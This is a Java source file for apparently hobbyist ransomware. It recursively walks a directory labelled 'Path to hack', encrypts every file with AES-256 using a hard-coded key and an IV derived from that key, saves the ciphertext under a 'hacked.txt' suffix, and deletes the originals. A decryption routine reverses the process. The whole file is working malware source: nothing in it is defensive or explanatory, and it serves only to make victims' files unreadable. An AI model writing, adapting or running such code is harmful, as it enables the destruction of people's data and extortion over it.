import java.io.IOException;
import java.util.Base64;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.io.FileWriter;
import java.io.File;
class Main {

    public static void main(String[] args) throws Exception{
//        String decryptionText;
//        AES256 aes256 = new AES256();
//        String filetext = HandlingFile.ReadFile("D:\\clang_hacking\\Project1\\src\\hello");
//        String cipherText = aes256.encrypt(filetext);
//        HandlingFile.WriteF_DeleteF("D:\\clang_hacking\\Project1\\src\\hello", cipherText);
//        decryptionText = aes256.decrypt(cipherText);
//
//        HandlingFile.decryption_file("D:\\clang_hacking\\Project1\\src\\hello", decryptionText);
//        System.out.println(filetext);
//        System.out.println(cipherText);
//
//        System.out.println(decryptionText);
        HandlingFile.get_directory("Path to hack"); //change directory
    }

}

class HandlingFile{
    public static void get_directory(String FilePath) throws Exception {
        String[] files = HandlingFile.GetFilePath(FilePath);

        for (int i = 0; i < files.length; i++) {

            System.out.println(files[i]);

            String path = FilePath + "\\" + files[i];
            int dotIndex = path.indexOf(".");
            if (dotIndex != -1) {
                HandlingFile.encryption_file(path); // when you want to decrypt file then change to HandlingFile.decryption_file(path);
            } else {
                get_directory(path);
            }
        }
    }
    public static String[] GetFilePath(String directoryPath) throws IOException {
        File directory = new File(directoryPath);

        String[] files = directory.list();

        return files;
    }
    public static String ReadFile(String Filepath) throws Exception {
        String content = "";
        Path path = Paths.get(Filepath);
        try {
            content = Files.readString(path);
            return content;

        } catch (IOException e) {
            e.printStackTrace();
        }
        return content;
    }

    public static void encryption_file(String filename) throws Exception {
        try {
            AES256 aes256 = new AES256();
            String filetext = HandlingFile.ReadFile(filename);
            String cipherText = aes256.encrypt(filetext);
            String Outfilename = filename + "hacked.txt";
            File Createfile = new File(Outfilename);
            Createfile.createNewFile();
            FileWriter writer = new FileWriter(Outfilename);
            writer.write(cipherText);
            writer.close();
            File file = new File(filename);
            if (file.delete()){
                System.out.println("File deleted successfully");
            } else {
                System.out.println("Failed to delete the file");
            }
        } catch (IOException e){
            e.printStackTrace();
        }
    }
    public static void decryption_file(String filename) throws Exception {
        try {
            AES256 aes256 = new AES256();
            String filetext = HandlingFile.ReadFile(filename);
            System.out.println(filetext);
            String outfilename = filename.substring(0, filename.length() - 10);
            String cipherText = aes256.decrypt(filetext);
            File CreateFile = new File(outfilename);
            CreateFile.createNewFile();
            FileWriter writer = new FileWriter(outfilename);
            writer.write(cipherText);
            writer.close();
            File file = new File(filename);
            if (file.delete()) {
                System.out.println("File deleted successfully");
            } else {
                System.out.println("Failed to delete the file");
            }
        } catch (IOException e){
            e.printStackTrace();
        }
    }
}

class AES256 {
    public static String alg = "AES/CBC/PKCS5Padding";
    private final String key = "01234567890123456789012345678901";
    private final String iv = key.substring(0, 16); // 16byte

    public String encrypt(String text) throws Exception {
        Cipher cipher = Cipher.getInstance(alg);
        SecretKeySpec keySpec = new SecretKeySpec(key.getBytes(), "AES");
        IvParameterSpec ivParamSpec = new IvParameterSpec(iv.getBytes());
        cipher.init(Cipher.ENCRYPT_MODE, keySpec, ivParamSpec);

        byte[] encrypted = cipher.doFinal(text.getBytes("UTF-8"));
        return Base64.getEncoder().encodeToString(encrypted);
    }

    public String decrypt(String cipherText) throws Exception {
        Cipher cipher = Cipher.getInstance(alg);
        SecretKeySpec keySpec = new SecretKeySpec(key.getBytes(), "AES");
        IvParameterSpec ivParamSpec = new IvParameterSpec(iv.getBytes());
        cipher.init(Cipher.DECRYPT_MODE, keySpec, ivParamSpec);

        byte[] decodedBytes = Base64.getDecoder().decode(cipherText);
        byte[] decrypted = cipher.doFinal(decodedBytes);
        return new String(decrypted, "UTF-8");
    }
}